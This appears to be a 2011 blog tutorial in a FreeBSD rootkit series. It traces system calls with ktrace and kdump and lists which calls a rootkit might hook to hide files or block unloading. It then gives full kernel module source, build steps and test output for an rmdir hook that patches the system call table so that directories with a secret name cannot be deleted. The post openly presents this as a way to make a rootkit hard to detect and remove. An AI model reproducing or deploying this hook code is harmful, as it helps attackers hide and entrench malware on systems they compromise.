---
title        : "FreeBSD Rootkit Design Howtos - 9 - Hook Kernel Process Tracking and rmdir_hook Example"
date         : "2011-07-24"
tags         : [FreeBSD, Rootkit, C++]
---

It has been a long time since I posted last note on system hooks and a
mkdir_hook example. A lot of things happened during these days and I just didn’t
manage to get back and post this one. As a matter of fact, the code for this
note has been ready since at least a month ago. I don’t know whether there’s
anyone waiting for me to update this series but I must admit that I feel bad to
had to pause it for a while. I’m glad that I finally have time again to work on
this

Nevertheless, I’m back. Enough talking about my personal issues, and let’s get
right back to our topic, the long waiting kernel tracing and rmdir_hook example.

## Trace the Kernel Calls

Let's say you have this great idea you want to implement in your rootkit, it
does the most despicable things and is as elusive as the shadow, but you may
feel lost when you try to code this awesome idea -- what are the system calls I
should hook to implement certain functionalities?

Fret not, we can trace the kernel calls to find out what system calls are called
when certain actions are performed. For example, what are the system calls
involved when the host establishes a new TPC connection?

There are only two simple commands involved here for us to track a kernel
behavior, ktrace and kdump.

`ktrace` requires a parameter to pass which should be an executable action that
you want the system to perform. Once the action’s done, a trace output file will
be generated. And then we can utilize `kdump` to view a list of all kernel calls
when performing the command we specified earlier. Let’s see an example now.

``` shell
ZFSTest# cd /tmp
ZFSTest# mkdir test_folder
ZFSTest# ktrace rmdir test_folder
ZFSTest# ls
.ICE-unix       .XIM-unix       conftest.osav       ktrace.out      mysql.sock      test
.X11-unix       .font-unix      conftest.sav        make_fifo_KyuyJ99a2 rmtest
ZFSTest#
```

What we did was we firstly created a testing folder called ***test_folder*** and
then removed the folder by using ***rmdir*** command and traced the kernel
activities while we issued the command. A trace result was generated and saved
in the current working folder called ***ktrace.out***.

Please keep in mind that in order for ktrace to successfully and fully get your
desired result, the command you issued should complete successfully in the first
place. Which means, if we plan to see what happens when we delete a folder, and
we don’t specify which folder to delete, then we won’t be able to trace the
actual folder-deleting kernel call since it wasn’t triggered at all. For
example, we can’t get the information about the folder-deleting kernel call if
we issued the following command.

``` c++
ZFSTest# ktrace rmdir
usage: rmdir [-pv] directory ...
ZFSTest#
```

That’s because the rmdir command exits straight away after printing the help
information on the screen since it didn’t receive any folder to delete, so that
the folder-deleting function was not called, and obviously not in the ktrace.out
file.

Let’s now take a look at the output file by issuing kdump command which by
default will look for ktrace.out file in current working directory.

``` shell
ZFSTest# kdump | less
  2769 ktrace   RET   ktrace 0
  2769 ktrace   CALL  execve(0x7fffffffe590,0x7fffffffeb10,0x7fffffffeb28)
  2769 ktrace   NAMI  "/sbin/rmdir"
  2769 ktrace   RET   execve -1 errno 2 No such file or directory
  2769 ktrace   CALL  execve(0x7fffffffe590,0x7fffffffeb10,0x7fffffffeb28)
  2769 ktrace   NAMI  "/bin/rmdir"
  2769 ktrace   NAMI  "/libexec/ld-elf.so.1"
  2769 rmdir    RET   execve 0
  2769 rmdir    CALL  mmap(0,0x8000,0x3<PROT_READ|PROT_WRITE>,0x1002<MAP_PRIVATE|MAP_ANON>,0xffffffff,0)
  2769 rmdir    RET   mmap 34365181952/0x800531000
  2769 rmdir    CALL  issetugid
  2769 rmdir    RET   issetugid 0

...
...

  2769 rmdir    RET   read 128/0x80
  2769 rmdir    CALL  lseek(0x3,0x80,SEEK_SET)
  2769 rmdir    RET   lseek 128/0x80
  2769 rmdir    CALL  read(0x3,0x800534000,0x42)

...
...

  2769 rmdir    CALL  sigprocmask(SIG_SETMASK,0x8006394d0,0)
  2769 rmdir    RET   sigprocmask 0
  2769 rmdir    CALL  rmdir(0x7fffffffed5e)
  2769 rmdir    NAMI  "test_folder"
  2769 rmdir    RET   rmdir 0

...
...

  2769 rmdir    CALL  exit(0)
```

There were many different system calls performed when we deleted the
test_folder, but the one that we concern most should be rmdir system call
at 2769. If you only want to get a name of the system call of a specific
command, like what we want here, you can even filter the result by searching
keyword CALL to only concentrate on system calls and their names.

``` shell
ZFSTest# kdump | grep CALL
  2769 ktrace   CALL  execve(0x7fffffffe590,0x7fffffffeb10,0x7fffffffeb28)
  2769 ktrace   CALL  execve(0x7fffffffe590,0x7fffffffeb10,0x7fffffffeb28)
  2769 rmdir    CALL  mmap(0,0x8000,0x3<PROT_READ|PROT_WRITE>,0x1002<MAP_PRIVATE|MAP_ANON>,0xffffffff,0)
  2769 rmdir    CALL  issetugid
  2769 rmdir    CALL  open(0x80052ca92,0<O_RDONLY>,<unused>0x1b6)
  2769 rmdir    CALL  open(0x80052bba9,0<O_RDONLY>,<unused>0x2f)
  2769 rmdir    CALL  read(0x3,0x7fffffffe040,0x80)
  2769 rmdir    CALL  lseek(0x3,0x80,SEEK_SET)
  2769 rmdir    CALL  read(0x3,0x800534000,0x42)
  2769 rmdir    CALL  close(0x3)
  2769 rmdir    CALL  access(0x800535000,0<F_OK>)
  2769 rmdir    CALL  open(0x800532040,0<O_RDONLY>,<unused>0x63a5e0)
  2769 rmdir    CALL  fstat(0x3,0x7fffffffe2c0)
  2769 rmdir    CALL  pread(0x3,0x8006395c0,0x1000,0)
  2769 rmdir    CALL  mmap(0,0x248000,0<PROT_NONE>,0x21002<MAP_PRIVATE|MAP_ANON|MAP_NOCORE>,0xffffffff,0)
  2769 rmdir    CALL  mmap(0x800647000,0x10e000,0x5<PROT_READ|PROT_EXEC>,0x20012<MAP_PRIVATE|MAP_FIXED|MAP_NOCORE>,0x3,0)
  2769 rmdir    CALL  mmap(0x800854000,0x1f000,0x3<PROT_READ|PROT_WRITE>,0x12<MAP_PRIVATE|MAP_FIXED>,0x3,0x10d000)
  2769 rmdir    CALL  mprotect(0x800873000,0x1c000,0x3<PROT_READ|PROT_WRITE>)
  2769 rmdir    CALL  close(0x3)
  2769 rmdir    CALL  sysarch(0x81,0x7fffffffe3a0)
  2769 rmdir    CALL  munmap(0x800538000,0x1000)
  2769 rmdir    CALL  mmap(0,0x19000,0x3<PROT_READ|PROT_WRITE>,0x1002<MAP_PRIVATE|MAP_ANON>,0xffffffff,0)
  2769 rmdir    CALL  sigprocmask(SIG_BLOCK,0x8006394c0,0x7fffffffe370)
  2769 rmdir    CALL  sigprocmask(SIG_SETMASK,0x8006394d0,0)
  2769 rmdir    CALL  sigprocmask(SIG_BLOCK,0x8006394c0,0x7fffffffe340)
  2769 rmdir    CALL  sigprocmask(SIG_SETMASK,0x8006394d0,0)
  2769 rmdir    CALL  rmdir(0x7fffffffed5e)
  2769 rmdir    CALL  sigprocmask(SIG_BLOCK,0x8006394c0,0x7fffffffe990)
  2769 rmdir    CALL  sigprocmask(SIG_SETMASK,0x8006394d0,0)
  2769 rmdir    CALL  sigprocmask(SIG_BLOCK,0x8006394c0,0x7fffffffe940)
  2769 rmdir    CALL  sigprocmask(SIG_SETMASK,0x8006394d0,0)
  2769 rmdir    CALL  exit(0)
```

### How About Some Invincible Folders, Sir?

As what we can see from above results, the rmdir seems to be the final call
which the kernel actually performs the deleting operation. So give our goal is
to have non-deletable folders, which obviously, by hooking rmdir system calls,
we can make certain folders survive from deletion. It is important for rootkits
to not be detected and removed so easily, now let's jump right into in.

One may argue that the user can delete a folder with many different commands, such
as rm -r or what if rm -rf? Will the system call the same for all
folder-deleting operations even if they were issued by different command? The
answer is yes.

``` shell
ZFSTest# mkdir test_folder
ZFSTest# ktrace rm -rf test_folder/
ZFSTest#
```

We may get different system call routines, but will surely end up with this:

``` shell
...
...
  2824 rm       CALL  close(0x3)
  2824 rm       CALL  access(0x800537000,0<F_OK>)
  2824 rm       CALL  open(0x800534040,0<O_RDONLY>,<unused>0x63c5e0)
...
...
  2824 rm       CALL  close(0x4)
  2824 rm       CALL  fchdir(0x3)
  2824 rm       CALL  rmdir(0x800c10100)
...
...
  2824 rm       CALL  exit(0)
```

As you can see, the system call that actually did the deletion is still rmdir.
In fact, most of the kernel calls are simple and reusable, may be used by
multiple different userland applications. Here’s a list of command system calls
from the book.

| System Call                    | Possible Purpose of Hooking             |
|--------------------------------|-----------------------------------------|
| read, readv, pread, preadv     | Logging Input                           |
| write, writev, pwrite, pwritev | Logging Output                          |
| open                           | Hiding File Contents                    |
| unlink                         | Preventing File Removal                 |
| chdir                          | Preventing Directory Traversal          |
| chmod                          | Preventing File Mode Modification       |
| chown                          | Preventing Ownership Change             |
| kill                           | Preventing Signal Sending               |
| ioctl                          | Manipulating ioctl Request              |
| execve                         | Redirecting File Execution              |
| rename                         | Preventing File Renaming                |
| rmdir                          | Preventing Directory Removal            |
| stat, lstat                    | Hiding File Status                      |
| getdirentries                  | Hiding Files                            |
| truncate                       | Preventing file Truncating or Extending |
| kldload                        | Preventing Module Loading               |
| kldunload                      | Preventing Module Unloading             |

### How Does Kernel Delete Folders

So before we actually starting working on our rmdir hooking code, we need to
firstly understand how the original rmdir function works. The source code of
rmdir command is available at: /usr/src/bin/rmdir/rmdir.c.

``` c++
   #if 0
    #ifndef lint
    static char const copyright[] =
    "@(#) Copyright (c) 1992, 1993, 1994n
            The Regents of the University of California.  All rights reserved.n";
    #endif /* not lint */

    #ifndef lint
    static char sccsid[] = "@(#)rmdir.c     8.3 (Berkeley) 4/2/94";
    #endif /* not lint */
    #endif
    #include <sys/cdefs.h>
    __FBSDID("$FreeBSD: head/bin/rmdir/rmdir.c 140851 2005-01-26 06:51:28Z ssouhlal $");

    #include <err.h>
    #include <stdio.h>
    #include <stdlib.h>
    #include <string.h>
    #include <unistd.h>

    static int rm_path(char *);
    static void usage(void);

    static int pflag;
    static int vflag;

    int
    main(int argc, char *argv[])
    {
        int ch, errors;

        while ((ch = getopt(argc, argv, "pv")) != -1)
        switch(ch) {
            case 'p':
                pflag = 1;
                break;
            case 'v':
                vflag = 1;
                break;
            case '?':
            default:
                usage();
        }
        argc -= optind;
        argv += optind;

        if (argc == 0)
            usage();

        for (errors = 0; *argv; argv++) {
            if (rmdir(*argv) < 0) {
                warn("%s", *argv);
                errors = 1;
            } else {
                if (vflag)
                printf("%sn", *argv);
                if (pflag)
                errors |= rm_path(*argv);
            }
        }
        exit(errors);
    }


    static int
    rm_path(char *path)
    {
            char *p;

            p = path + strlen(path);
            while (--p > path && *p == '/')
                    ;
            *++p = '�';
            while ((p = strrchr(path, '/')) != NULL) {
                    /* Delete trailing slashes. */
                    while (--p >= path && *p == '/')
                            ;
                    *++p = '�';
                    if (p == path)
                            break;

                    if (rmdir(path) < 0) {
                            warn("%s", path);
                            return (1);
                    }
                    if (vflag)
                            printf("%sn", path);
            }

            return (0);
    }

    static void
    usage(void)
    {

            (void)fprintf(stderr, "usage: rmdir [-pv] directory ...n");
            exit(1);
    }
```

The code is simple. It calls rmdir straight away with path specified unless
pflag was provided to delete every component in the path specified. So now what
we need to do is simply hooking rmdir system call.

## The rmdir_hook & Summary

This is pretty much all we need to know about kernel activity tracing. We’ve
successfully hunted down the final call which FreeBSD kernel utilizes to delete
a folder, looked at it's source code and understood how it works. Now let's
actually code the hook to prevent our folders from being deleted by rmdir system
call.

``` c++
#include <sys/types.h>
#include <sys/param.h>
#include <sys/proc.h>
#include <sys/module.h>
#include <sys/sysent.h>
#include <sys/kernel.h> //New
#include <sys/systm.h>
#include <sys/syscall.h>
#include <sys/sysproto.h>

/* The system call's arguments. */
/* Refer to /usr/src/bin/rmdir */
struct rmdir_hook_args {
    char *path;
};

/* rmdir system call hook */
static int rmdir_hook(struct thread *td, void *syscall_args)
{
    struct rmdir_hook_args *uap;
    uap = (struct rmdir_hook_args *)syscall_args;

    char path[255];
    size_t done;
    int error;

    error = copyinstr(uap->path, path, 255, &done);
    if (error!=0)
        return(error);

    /* print a debug message */
    uprintf("The directory "%s" will be removed!n", path);

    /* Check if the secret dir is to be removed */
    char secret[] = "hailang";

    /*
        If path is a directory name.
        Plain name without '/'
    */
    if(!strcmp(path,secret))
    {
        uprintf("[Deleting folder]... FAILEDn");
        return 0; //Exit
    }
    /*
        If path is a path

        Including absolute path like /usr/local/etc/[secret]
        and ./../tmp/test/[secret]

        The deletion will be denied as long as the path contains [secret]
        e.g. /usr/local/etc/[secret]/test1/test2 will be denied.
    */
    else
    {
        char *pch;
        char *path_ptr = path;

        /* char *strsep(char **stringp, const char *delim); */
        while((pch = strsep (&path_ptr,"/")) != NULL)
        {
                if(!strcmp(pch,secret))
                {
                    uprintf("[Deleting folder]... FAILEDn");
                    return 0; //Exit
                }
        }
    }

    int errors = rmdir(td, syscall_args);
    return errors;
}

/* The sysent for the new system call */
static struct sysent rmdir_hook_sysent = {
    1,          /* number of arguments */
    rmdir_hook  /* implementing function */
};

/* The offset in sysent[] where the system call is to be allocated. */
static int offset = NO_SYSCALL;

/* The function called at load/unload. */
static int load(struct module *module, int cmd, void *arg)
{
    int error=0;

    switch(cmd) {
        case MOD_LOAD:
            /* Replace mkdir with mkdir_hook. */
            sysent[SYS_rmdir].sy_call = (sy_call_t *)rmdir_hook;
            uprintf("The rmdir_hook is loaded, you can try to rmdir now.n");
            break;

        case MOD_UNLOAD:
            /* Change everything back to normal. */
            sysent[SYS_rmdir].sy_call = (sy_call_t *)rmdir;
            uprintf("The rmdir_hook is unloaded, everything is back to normal now.n");
            break;

        default:
            error = EOPNOTSUPP;
            break;
    }

    return(error);
}

SYSCALL_MODULE(rmdir_hook, &offset, &rmdir_hook_sysent, load, NULL);
```

What I did was basically copy the ***mkdir_hook*** sample from last note and changed
some minor things such as function names and etc. What really matters is the
logic in the implementing function which we firstly copy the path specified by
the user from userland to kernel space and then check against a pre-defined
***secret***.

What we are trying to achieve is to prevent any path that has the secret word
inside from being deleted by the user. What we need to do is to check the path
and see whether the secret word is inside or not. Here comes another problem
that we need to think about just for a few minutes.

### The Absolute Path and Relative Path

We all know the difference between ***absolute path*** and ***relative path***.
The troublesome part here is that rmdir accepts both of them, meaning that all
following commands are acceptable.

``` shell
rmdir /usr/local/etc/test_conf
rmdir ./../local/etc/test_conf
rmdir local/etc/../../local/etc/test_conf
```

We need to protect our folders from being deleted by using relative path, that’s
why another checking was implemented in the sample code above to trim ‘/’ from
path to see is there any part in the path that matches the secret.

What the code does after that is simple enough, it triggers original rmdir call
if secret was not present in the path and the return the status of the execution
so that users will be able to see original error messages as well.

Of course, in a real life rootkit, you probably don't want to print out debug
messages saying the deletion failed, they are just for the purpose of this
demonstration.

Save the following makefile in the same directory and compile the code.

``` makefile
FILE: makefile
KMOD=   rmdir_hook
SRCS=   rmdir_hook.c

.include <bsd.kmod.mk>
```

``` shell
ZFSTest# make
Warning: Object directory not changed from original /zroot/development/4.Hooks/extra
cc -O2 -pipe -fno-strict-aliasing -Werror -D_KERNEL -DKLD_MODULE -nostdinc   -I. -I@ -I@/contrib/altq -finline-limit=8000 --param inline-unit-growth=100 --param large-function-growth=1000 -fno-common  -fno-omit-frame-pointer  -mcmodel=kernel -mno-red-zone  -mfpmath=387 -mno-sse -mno-sse2 -mno-sse3 -mno-mmx -mno-3dnow  -msoft-float -fno-asynchronous-unwind-tables -ffreestanding -fstack-protector -std=iso9899:1999 -fstack-protector -Wall -Wredundant-decls -Wnested-externs -Wstrict-prototypes  -Wmissing-prototypes -Wpointer-arith -Winline -Wcast-qual  -Wundef -Wno-pointer-sign -fformat-extensions -c rmdir_hook.c
ld  -d -warn-common -r -d -o rmdir_hook.ko rmdir_hook.o
:> export_syms
awk -f /sys/conf/kmod_syms.awk rmdir_hook.ko  export_syms | xargs -J% objcopy % rmdir_hook.ko
objcopy --strip-debug rmdir_hook.ko
ZFSTest#
```

### Testing The Invincibility

``` shell
ZFSTest# mkdir -p /tmp/1/hailang/2
ZFSTest# mkdir /tmp/1/hailang/3
ZFSTest# kldload ./rmdir_hook.ko
The rmdir_hook is loaded, you can try to rmdir now.
ZFSTest# rmdir /tmp/1/hailang/
The directory "/tmp/1/hailang/" will be removed!
[Deleting folder]... FAILED
ZFSTest# rmdir /tmp/1/hailang/*
The directory "/tmp/1/hailang/2" will be removed!
[Deleting folder]... FAILED
The directory "/tmp/1/hailang/3" will be removed!
[Deleting folder]... FAILED
ZFSTest# rm -rf /tmp/1/hailang/*
The directory "/tmp/1/hailang/2" will be removed!
[Deleting folder]... FAILED
The directory "/tmp/1/hailang/3" will be removed!
[Deleting folder]... FAILED
ZFSTest# cd /tmp/1
ZFSTest# rmdir ./../1/hailang/2/
The directory "./../1/hailang/2/" will be removed!
[Deleting folder]... FAILED
ZFSTest#
```

Looks like it's working as intended, but much more are needed for it to become a
full-fledged rootkit.

Play with the sample code, trace your kernel, write your own descipable hooks
and share them if you want. I think I have demonstrated what powerful and fun
things we can potentially achieve with kernel hooking. Have fun!
